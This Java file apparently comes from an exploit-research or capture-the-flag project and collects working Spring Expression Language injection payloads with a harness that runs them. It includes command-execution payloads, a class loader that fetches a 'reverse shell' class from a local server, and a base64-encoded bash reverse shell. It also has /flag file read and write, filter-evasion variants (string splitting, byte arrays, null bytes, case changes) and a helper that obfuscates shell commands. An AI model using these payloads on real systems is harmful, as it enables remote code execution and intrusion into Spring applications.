package xyz.eki.marshalexp.solution;

import org.springframework.expression.Expression;
import org.springframework.expression.spel.standard.SpelExpressionParser;

import javax.script.ScriptEngineFactory;
import javax.script.ScriptEngineManager;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.List;

public class SpEL {
    private static void Shell2ASCII(String shell) throws IOException {

        StringBuilder part1_shell = new StringBuilder("T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(")
                .append((int) shell.charAt(0));
        for (int i = 1; i < shell.length(); i++) {
            part1_shell.append(".concat(T(java.lang.Character).toString(")
                    .append((int) shell.charAt(i))
                    .append("))");
        }
        part1_shell.append(")");
        System.out.println("\nPart1: ");
        System.out.println(part1_shell.toString() + "\n");

        StringBuilder part2_shell = new StringBuilder("new java.lang.ProcessBuilder(new String[]{");
        String[] args = shell.split(" ");
        int len_args = args.length;
        int len_temp = 0;
        while (len_temp < len_args) {
            StringBuilder temp = new StringBuilder("new java.lang.String(new byte[]{");
            for (int i = 0; i < args[len_temp].length(); i++) {
                temp.append((int) args[len_temp].charAt(i));
                if (i != args[len_temp].length() - 1) {
                    temp.append(",");
                }
            }
            temp.append("})");
            part2_shell.append(temp.toString());
            len_temp++;
            if (len_temp != len_args) {
                part2_shell.append(",");
            }
        }
        part2_shell.append("}).start()");
        System.out.println("\nPart2: ");
        System.out.println(part2_shell.toString() + "\n");
    }

    public static void EmunEngins() throws Exception{
        ScriptEngineManager manager = new ScriptEngineManager();
        List<ScriptEngineFactory> factories = manager.getEngineFactories();
        for (ScriptEngineFactory factory: factories){
            System.out.printf(
                    "Name: %s%n" + "Version: %s%n" + "Language name: %s%n" +
                            "Language version: %s%n" +
                            "Extensions: %s%n" +
                            "Mime types: %s%n" +
                            "Names: %s%n",
                    factory.getEngineName(),
                    factory.getEngineVersion(),
                    factory.getLanguageName(),
                    factory.getLanguageVersion(),
                    factory.getExtensions(),
                    factory.getMimeTypes(),
                    factory.getNames()
            );
        }
    }

    public static void execute(String payload) throws Exception{
        SpelExpressionParser spelExpressionParser = new SpelExpressionParser();
        Expression expression = spelExpressionParser.parseExpression(payload);
        Object value = expression.getValue();
        System.out.println(value);
    }

    /*
    Runtime
     */
    public static void Rce1() throws Exception{
        String payload = "T(java.lang.Runtime).getRuntime().exec(\"mate-calc\")";
        execute(payload);
    }

    /*
    ScriptEngineManager
    Mime types: [application/javascript, application/ecmascript, text/javascript, text/ecmascript]
    Names: [nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]
     */
    public static void Rce2() throws Exception{
        String payload = "new javax.script.ScriptEngineManager().getEngineByName(\"JavaScript\").eval(\"s='mate-calc';java.lang.Runtime.getRuntime().exec(s);\")";
        execute(payload);
    }

    /*
    URLClassLoader
     */
    public static void Rce3() throws Exception{
        String expUrl = "http://127.0.0.1:9999/ReverseShellEvilClass3.class";
        String expClassName = "xyz.eki.marshalexp.exploit.ReverseShellEvilClass3";
        String listenAddr = "127.0.0.1:10000";
        String payload = "new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(\""
                + expUrl
                +"\")}).loadClass(\""
                + expClassName
                + "\").getConstructors()[0].newInstance(\""
                + listenAddr
                +"\")";
        System.out.println(payload);
        execute(payload);
    }



    /*
    AppClassLoader
     */
    public static void Rce4() throws Exception{
//        String payload = "T(ClassLoader).getSystemClassLoader().loadClass(\"java.lang.Runtime\").getRuntime().exec(\"mate-calc\")\n";
//        String payload = "T(org.springframework.expression.spel.standard.SpelExpressionParser).getClassLoader().loadClass(\"java.lang.Runtime\").getRuntime().exec(\"mate-calc\")";
        String payload = "T(String).getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"mate-calc\")";
        execute(payload);
    }

    /*
    ProcessBuilder
     */
    public static void Rce5() throws Exception{
//        String payload = "T(ClassLoader).getSystemClassLoader().loadClass(\"java.lang.Runtime\").getRuntime().exec(\"mate-calc\")\n";
//        String payload = "T(org.springframework.expression.spel.standard.SpelExpressionParser).getClassLoader().loadClass(\"java.lang.Runtime\").getRuntime().exec(\"mate-calc\")";
        String payload = "NeW ProcessBuilder(\"mate-calc\").start()";
        execute(payload);
    }

    /*
    JDK9 JShell
     */
    public static void Rce6() throws Exception{
        String payload = "T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(\"jdk.jshell.JShell\",true).Methods[6].invoke(null,{}).eval('mate-calc').toString()";
        execute(payload);
    }

    public static void FileRead() throws Exception{
        String payload = "new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get(T(java.net.URI).create(\"file:///flag\"))))";
        execute(payload);
    }

    public static void FileWrite() throws Exception{
        String payload = "T(java.nio.file.Files).write(T(java.nio.file.Paths).get(T(java.net.URI).create(\"file:///flag\")), 'flag{this-is-flag}'.getBytes(), T(java.nio.file.StandardOpenOption).TRUNCATE_EXISTING)";
        execute(payload);
    }
    
    /*
    Bypass String filter with concat
     */
    public static void bypassCase1() throws Exception{
        String payload = "T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]{\"mate-calc\"})";
        execute(payload);
    }

    /*
    Bypass String filter with ascii
     */
    public static void bypassCase2() throws Exception{
//        Shell2ASCII("mate-calc");
        String payload = "new java.lang.ProcessBuilder(new String[]{new java.lang.String(new byte[]{109,97,116,101,45,99,97,108,99})}).start()";
        execute(payload);
    }

    /*
    Bypass with \0
     */
    public static void bypassCase3() throws Exception{
        String payload = "T\0(String).getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"mate-calc\")";
        execute(payload);
    }

    /*
    Bypass with Upper case
     */
    public static void bypassCase4() throws Exception{
        String payload = "New ProcessBuilder(\"bash\",\"-c\",\"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTAwMDAgMD4mMQo=}|{base64,-d}|{bash,-i}\").start()";
        execute(payload);
    }

    /*
    Get Result by Scanner
     */
    public static void getResult() throws Exception{
        String payload = "new java.util.Scanner(new java.lang.ProcessBuilder(\"ls\", \"/\").start().getInputStream(), \"GBK\").useDelimiter(\"h3rmesk1t\").next()\n";
        execute(payload);
    }

    public static void main(String[] args) throws Exception{
        bypassCase4();
    }


}
